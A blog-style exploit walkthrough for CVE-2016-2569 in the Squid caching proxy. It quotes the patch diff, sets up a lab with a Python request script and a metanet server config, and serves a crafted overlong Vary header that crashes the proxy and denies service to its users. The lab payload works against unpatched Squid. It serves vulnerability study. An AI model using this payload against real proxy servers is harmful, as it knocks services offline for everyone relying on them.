Hello there,

Thank you for reading my first blog entry. Today we will go with exploit creation for one of the open-source tool Squid Caching proxy server.

#### So What Is Squido?

Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages. Squid has extensive access controls and makes a great server accelerator. It runs on most available operating systems, including Windows and is licensed under the GNU GPL. You can find more about Squid Cahching proxy at their official website [http://www.squid-cache.org/]

#### What Is CVE-2016-2569?

Fistly I hope you know you know what is CVE :p Anyways it stands for  Common Vulnerabilities and Exposures (More info about CVE can be found at [https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures])

We can see the following information about CVE-2016-2569

Description: Squid 3.x before 3.5.15 and 4.x before 4.0.7 does not properly append data to String objects, which allows remote servers to cause a denial of service (assertion failure and daemon exit) via a long string, as demonstrated by a crafted HTTP Vary header. Mathias Fischer from Open Systems AG reported this vulnerability.

#### Vulnerability Analysis

As this is open-source project we can see the patch used in order to mitigate this vulnerability. Based on the vulnerability description provided we can confirm that this is some sort of overflow attempt. We will continue to dig deeper in to the source to investigate further.

The patch [http://www.squid-cache.org/Versions/v3/3.5/changesets/squid-3.5-13991.patch] confirms changes were made to following files
1. src/SquidString.h
2. src/StrList.cc
3. src/String.cc
4. src/clients/Client.h
5. src/clients/FtpClient.cc
6. src/http.cc

Lets dig deeper....

Code diff for src/String.cc looks interesting as it makes assertion for aSize variable

----------------------------------------------------------------------
```
=== modified file 'src/String.cc'
--- src/String.cc	2016-01-01 00:14:27 +0000
+++ src/String.cc	2016-02-19 23:15:41 +0000
@@ -42,7 +42,7 @@
 String::setBuffer(char *aBuf, String::size_type aSize)
 {
     assert(undefined());
-    assert(aSize < 65536);
+    assert(aSize <= SizeMax_);
     buf_ = aBuf;
     size_ = aSize;
 }
@@ -171,7 +171,7 @@
     } else {
         // Create a temporary string and absorb it later.
         String snew;
-        assert(len_ + len < 65536); // otherwise snew.len_ overflows below
+        assert(canGrowBy(len)); // otherwise snew.len_ may overflow below
         snew.len_ = len_ + len;
         snew.allocBuffer(snew.len_ + 1);
```
----------------------------------------------------------------------

Based on the above code diff we can try to make an attempt to exploit the vulnerability by providing the value of the vary header to be more than 65536 bytes. 

Lets begin by creating the our exploit setup

We will set up the Squid Caching proxy on Linux system (We will use Xubuntu 16.04 LTS). The Squid caching proxy chaches the metanet HTTP server responses and send the responses to client from memory cache than quering server for similar request.

Our network topology would look something like shown below (Sorry for the being old school with topology but I'm still so in love with VIM)

```
-------------------------          -------------------------          -------------------------
|                       |          |                       |          |                       |
|         metanet       |  ---->   |         Squid         |  ----->  |         Client        |
|     192.168.56.102    |          |     Caching Proxy     |          |     192.168.56.1      |
|       HTTP Server     |  <----   |     TCP Port 3128     |  <----   |     Python Requests   |
|                       |          |                       |          |                       |
-------------------------          -------------------------          -------------------------
```

We will send standard queries to our nginx HTTP server via Squid proxy and check logs to figure out the setup is working as expected. 

To make our life easier we will use following python script to send the request to the server. One important thing to note here the headers used in the request allow the proxy server to cache the response. If the values of the HTTP request headers "If-Modified-Since", "max-age", and "cache-control" are not proper the client request would force the proxy server to query the server for responses. This would defeat the purpose of proxy server completely.

----------------------------------------------------------------------
```
Request.py

#!/usr/bin/env python

import requests, os

proxy = {'http': '192.168.56.102:3128'}
headers = {'If-Modified-Since': 'Wed, 24 Jan 2018 13:58:1 GMT', 'Accept': '*', 'max-age': '20000', 'cache-control': 'public', 'connetction': 'keep-alive', 'user-agent': 'requests2'}

if len(os.sys.argv) != 2:
    print "Usage: req [URI]"
    os.sys.exit()

print '\nhttp://192.168.56.102:8080/{}'.format(os.sys.argv[1])

r = requests.get('http://192.168.56.102:8080/{}'.format(os.sys.argv[1]), proxies=proxy, headers=headers)

print "\nHTTP Stat Code --> ", r.status_code

print
 
print "HTTP Response Headers \n", 
for h in r.headers:
    print h, ": ", r.headers[h] 
print

if 'Vary' in r.headers:
    print "Vary: ", r.headers['Vary'], "\n"
```
----------------------------------------------------------------------

We can see the above python code is setting headers, proxy and using python requests library to send the request to the HTTP server located at 192.168.56.102. Once we have the response from server or proxy we are printing out the headers. Specially we are interested in the Vary header response sent by the HTTP server or the proxy server.

Next thing in our setup is setting up metanet (HTTP server). We will use metanet because it is easy to send different HTTP response headers easily. As an alternative we can use SimpleHTTPServer which also allows us to send custom HTTP responses.

We need to prepare metanet config file in such a way that it responds with Vary header along with the necessary header which allow the Squid Caching proxy to cache the similar responses in the memory.

Our metanet config would look something like this

----------------------------------------------------------------------
```
[tcp/8080]

             "GET / " -> "HTTP/1.1 200 OK\r\n\r\n<html><body style=\"background-color: #000000; color: #FFFFFF\">Artificial Intelligence is no match for natural stupidity :p</html>\n",close()
                      * -> "HTTP/1.1 200 OK\r\nServer: metanet\r\nmax-age: 0\r\nDate: Thu, 26 Jan 2018 16:25:22 GMT\r\nLast-Modified: Thu, 1 Feb 2018 13:58:11 GMT\r\nVary:NULL\r\nConnection:keep-alive\r\n\r\n<html><body>Wut????</body></html>",close()
```
----------------------------------------------------------------------

Let's give it a try to see our setup indeed works!

![Squid Caching Proxy Setup](https://github.com/amit-raut/CVE-2016-2569/raw/master/Squid-Caching-Proxy-Setup.png "Squid Caching Proxy Setup")

Based on the our config everything looks in good shape. w00t w00t!

#### Exploitation

Lets make an effort to exploit vulnerability (passing long string based buffer along with HTTP Vary Response header). This is simple overflow exploitation. From the code diff we can see that there is assertion which defined the value of the a_size should not exceen 65536. We provide the length of the Vary header to be something that long.

Ideally we do not have 65536 standard HTTP Response headers (that would have been such a mess 😛); but we can make up headers. Just the thing matters in this case is the length of the string passed to the Vary header.

Lets use python to generate looong string like python -c 'print "a,b,c,d,e,f," *6000'. We will use this output and modify our metanet config like below and test our exploit

Our metanet config would look something like this

----------------------------------------------------------------------
```
[tcp/8080]

             "GET / " -> "HTTP/1.1 200 OK\r\n\r\n<html><body style=\"background-color: #000000; color: #FFFFFF\">Artificial Intelligence is no match for natural stupidity :p</html>\n",close()
                      * -> "HTTP/1.1 200 OK\r\nServer: metanet\r\nmax-age: 0\r\nDate: Thu, 26 Jan 2018 16:25:22 GMT\r\nLast-Modified: Thu, 1 Feb 2018 13:58:11 GMT\r\nVary:`a,b,c,d,e,f,`<reapeated 6000 times>"\r\nConnection:keep-alive\r\n\r\n<html><body>Wut????</body></html>",close()
```
----------------------------------------------------------------------

When we send our first request to proxy everything seems to be normal. The proxy didn't seem to be caching the responses; maybe because of the values we provided in the Vary header field. The response headers specified in the Vary header are taken in calculating the md5 sum to verify the cached contents.

Lets keep on sending multiple request to the proxy. Something is wrong here the proxy is not responding to our requests as we are getting "Proxy Error" from requeests library. Lets continue to send requests anyways.

Alas. The proxy stopped because of frequent failures. No device connecting to the server via proxy would be able to access anything. This is Denial of Service for all the proxy users. 

![Squid Proxy Exploitation using long Vary Header](https://github.com/amit-raut/CVE-2016-2569/blob/master/Squid-Caching-Proxy-Exploitation.png "Squid Proxy Exploitation using long Vary Header")

